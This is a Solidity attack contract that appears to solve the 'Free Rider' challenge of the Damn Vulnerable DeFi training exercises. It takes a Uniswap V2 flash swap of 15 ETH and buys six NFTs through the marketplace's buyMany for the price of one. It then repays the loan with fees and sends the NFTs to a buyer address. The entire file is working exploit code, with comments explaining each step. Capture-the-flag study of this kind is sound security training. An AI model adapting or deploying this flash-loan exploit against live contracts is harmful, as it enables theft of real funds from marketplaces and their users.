// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}


contract AttackFreeRider {
    IUniswapV2Pair uniPair;
    DamnValuableNFT nft;
    IWETH weth;
    IMarketplace marketplace;
    address buyer;

    constructor(IUniswapV2Pair _uniPair, DamnValuableNFT _nft, IWETH _weth, IMarketplace _marketplace, address _buyer) {
        uniPair = _uniPair;
        nft = _nft;
        weth = _weth;
        marketplace = _marketplace;
        buyer = _buyer;
    }

    function attack() public {
        // initiate the flash swap and take out 15 eth
        uniPair.swap(15 ether, 0, address(this), "put any calldata here to get flash swap");
    }

    // this is the function that gets hit when you recieve a flash swap
    function uniswapV2Call(
        address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data
    ) external  {
        // execute the code that you want in here from the swap
        // you flash swapped for weth. Turn weth in eth. token0 is weth and token1 is DVT
        weth.withdraw(_amount0);

        uint256[] memory nftArray = new uint256[](6);
        for (uint256 i=0; i <6; i++) {
            nftArray[i] = i;
        }

        // buy all the nfts for 15 ETH
        marketplace.buyMany{value: 15 ether}(nftArray);

        // convert back to weth with lp fees
        uint256 totalWithFees = (_amount0 * 100301) / 100000; // .3% LP fee for uniswap

        weth.deposit{value: totalWithFees}();

        // pay back flash swap to uniswap
        weth.transfer(msg.sender, totalWithFees);

        for (uint256 i=0; i<6; i++) {
            nft.safeTransferFrom(address(this), buyer, nftArray[i]);
        }
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        // you need to this function to be able to receive nfts
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}
}